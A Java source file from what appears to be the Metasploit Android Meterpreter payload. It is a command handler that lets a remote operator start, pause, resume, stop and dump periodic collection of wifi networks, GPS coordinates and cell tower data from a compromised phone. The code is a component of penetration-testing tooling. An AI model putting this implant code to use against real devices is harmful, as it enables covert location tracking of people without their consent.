package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.IntervalCollectionManager;
import com.metasploit.meterpreter.IntervalCollector;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;

import com.metasploit.meterpreter.command.Command;

public class android_interval_collect implements Command {
    private static final int TLV_EXTENSIONS = 20000;

    private static final int COLLECT_ACTION_START = 1;
    private static final int COLLECT_ACTION_PAUSE = 2;
    private static final int COLLECT_ACTION_RESUME = 3;
    private static final int COLLECT_ACTION_STOP = 4;
    private static final int COLLECT_ACTION_DUMP = 5;

    public static final int TLV_TYPE_COLLECT_TYPE = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9050);
    public static final int TLV_TYPE_COLLECT_ACTION = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9051);
    public static final int TLV_TYPE_COLLECT_TIMEOUT = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9052);

    // TLVs for all results
    public static final int TLV_TYPE_COLLECT_RESULT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9053);
    public static final int TLV_TYPE_COLLECT_RESULT_TIMESTAMP = TLVPacket.TLV_META_TYPE_QWORD
            | (TLV_EXTENSIONS + 9054);

    // TLVs for wifi (reusing the ones for wlan geolocate)
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI = android_wlan_geolocate.TLV_TYPE_WLAN_GROUP;       // 9022
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_BSSID = android_wlan_geolocate.TLV_TYPE_WLAN_BSSID; // 9023
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_SSID = android_wlan_geolocate.TLV_TYPE_WLAN_SSID;   // 9024
    public static final int TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL = android_wlan_geolocate.TLV_TYPE_WLAN_LEVEL; // 9025

    // TLV for Geolocation
    public static final int TLV_TYPE_COLLECT_RESULT_GEO = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9030);
    public static final int TLV_TYPE_GEO_LAT = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9011);
    public static final int TLV_TYPE_GEO_LONG = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9012);

    // TLVs for Cell
    public static final int TLV_TYPE_COLLECT_RESULT_CELL = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9060);
    public static final int TLV_TYPE_CELL_ACTIVE_GSM = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9061);
    public static final int TLV_TYPE_CELL_ACTIVE_CDMA = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9062);
    public static final int TLV_TYPE_CELL_NEIGHBOR = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9063);

    // TLVs for Cell Neighbors
    public static final int TLV_TYPE_CELL_NET_TYPE = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9065);
    public static final int TLV_TYPE_CELL_CID = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9066);
    public static final int TLV_TYPE_CELL_LAC = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9067);
    public static final int TLV_TYPE_CELL_PSC = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9068);
    public static final int TLV_TYPE_CELL_RSSI = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9069);

    // TLVs for CDMA networks
    public static final int TLV_TYPE_CELL_BASE_ID = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9070);
    public static final int TLV_TYPE_CELL_BASE_LAT = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9071);
    public static final int TLV_TYPE_CELL_BASE_LONG = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9072);
    public static final int TLV_TYPE_CELL_NET_ID = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9073);
    public static final int TLV_TYPE_CELL_SYSTEM_ID = TLVPacket.TLV_META_TYPE_UINT
            | (TLV_EXTENSIONS + 9074);


    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        boolean result = true;
        AndroidMeterpreter met = (AndroidMeterpreter) meterpreter;

        int action = request.getIntValue(TLV_TYPE_COLLECT_ACTION);

        IntervalCollectionManager manager = met.getIntervalCollectionManager();

        switch (action) {
            case COLLECT_ACTION_START: {
                result = this.startNew(manager, request);
                break;
            }
            case COLLECT_ACTION_PAUSE: {
                result = manager.pauseCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                break;
            }
            case COLLECT_ACTION_RESUME: {
                result = manager.resumeCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                break;
            }
            case COLLECT_ACTION_STOP: {
                IntervalCollector collector = manager.stopCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                if (collector != null) {
                    result = collector.dump(response);
                }
                else {
                    result = true;
                }
                break;
            }
            case COLLECT_ACTION_DUMP: {
                IntervalCollector collector = manager.getCollector(request.getIntValue(TLV_TYPE_COLLECT_TYPE));
                if (collector != null) {
                    result = collector.dump(response);
                }
                else {
                    result = true;
                }
                break;
            }
        }

        return result ? ERROR_SUCCESS: ERROR_FAILURE;
    }

    private boolean startNew(IntervalCollectionManager manager, TLVPacket request) {
        int type = request.getIntValue(TLV_TYPE_COLLECT_TYPE);
        long timeout = (long)request.getIntValue(TLV_TYPE_COLLECT_TIMEOUT);

        return manager.createCollector(type, timeout);
    }
}


